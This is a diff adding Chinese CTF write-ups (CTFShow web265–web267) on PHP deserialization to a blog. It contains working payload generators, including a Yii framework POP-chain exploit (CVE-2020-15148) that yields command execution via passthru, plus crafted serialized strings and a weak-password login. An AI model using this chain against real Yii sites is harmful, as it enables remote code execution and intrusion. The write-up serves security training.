@@ -1145,6 +1145,110 @@
 <li>访问 message.php 并随便设置一个 cookie: msg=1(注意 hackbar 设置 cookie 失败)</li>
 </ul>
 <p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web264.png" alt="flag"></p>
+<h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;login())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li><p>mt_rand()系统产生随机值，每次随机值都不一样，且由md5()包裹，那那么这个更是我们控制不了的。</p>
+</li>
+<li><p>在 class 中 要求 token === password， 全等，token控制不了，拿只能从 password 入手，让 password 等于token的地址。</p>
+</li>
+<li><p>$this-&gt;password = &amp;$this-&gt;token;</p>
+</li>
+</ul>
+<p>payload.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = &amp;<span class="keyword">$this</span>-&gt;token; <span class="comment">// 取地址。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfshowAdmin(<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>结果:</li>
+</ul>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web265.png"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?ctfshow=O:<span class="number">12</span>:<span class="string">&quot;ctfshowAdmin&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web265_1.png"></p>
+<h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@unserialize(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li>$cs = file_get_contents(‘php://input’); 此处利用了 伪协议，所以我们可以post提交数据。</li>
+<li>然后看 class 中 flag 在 destruct() 销毁的时候调用。其它三个函数调用不调用，正确，错误，在这道题中都不影响结果，唯有 destruct() 才影响结果。因此可以写一个空的class。</li>
+<li>下面的 if 语句 正则对 ‘ctfshow’ 进行了匹配，有则抛出异常 destruct()将提前终止。因此我们不能让它有异常。将 ctfshow 其中一个字符改为 大写,ex: Ctfshow or cTfshow …… 就能绕过。</li>
+</ul>
+<p>payload.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>结果:</li>
+</ul>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web266.png"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">0</span>:&#123;&#125; <span class="comment">//echo 结果.</span></span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;cTfshow&quot;</span>:<span class="number">0</span>:&#123;&#125; <span class="comment">//大写绕过正则。(破坏正确序列化结果。)</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将序列化结果 post 提交。在chrome浏览器Hack Bar插件中post 提交没反应。那就抓包提交(bp 大法好啊!)。</li>
+</ul>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web266_1.png"></p>
+<h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2><p>网页:</p>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267.png"></p>
+<p>题目变得贴近真实环境了。</p>
+<h3 id="信息搜集与利用"><a href="#信息搜集与利用" class="headerlink" title="信息搜集与利用"></a>信息搜集与利用</h3><ul>
+<li>Wappalyzer 插件可以看到这个网页由php Yii框架编写:</li>
+<li>弱口令 admin:admin 登陆成功。</li>
+</ul>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_1.png"></p>
+<ul>
+<li>在 about 页面 右键查看源代码发现提示: ?view-source</li>
+</ul>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_3.png"></p>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_2.png"></p>
+<ul>
+<li>看到 ?xxx 组成的内容很容易联想到 get 传参。所以我们来看看 页面的 url构成:</li>
+<li>url:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?r=site%<span class="number">2</span>Fabout <span class="comment">// %2F urldecode: &#x27;/&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>构造 url ,得到:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?r=site%<span class="number">2</span>Fabout&amp;view-source</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_4.png"></p>
+<ul>
+<li>如图所示得到了 反序列化的入口了。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?r=backdoor/shell&amp;code=</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>问题来了 code等于啥呢？</li>
+<li>百度一下 yii 反序列化漏洞，得到了一个链子,并且有 CVE-2020-15148;</li>
+<li>直接拿来利用。</li>
+</ul>
+<p>poc.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>此时可控参数为显示 phpinfo 验证一下。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?r=/backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_5.png"></p>
+<ul>
+<li>如图所示成功显示了 phpinfo(),接下来 尝试显示当前目录或者根目录文件</li>
+<li>将 poc.php 中设置可控参数 $this-&gt;checkAccess = ‘passthru’; (注意 system此处不可用，用 passthru可代替)</li>
+<li>设置 $this-&gt;id = ‘ls /‘;</li>
+</ul>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_6.png"></p>
+<ul>
+<li>如图所示 发现根目录有 flag</li>
+<li>设置  $this-&gt;id = ‘tac /flag’;</li>
+</ul>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_7.png"></p>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_9.png"></p>
+<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_8.png"></p>
+<ul>
+<li>如图所示成功拿到 flag。</li>
+</ul>
 ]]></content>
       <categories>
         <category>CTF笔记</category>
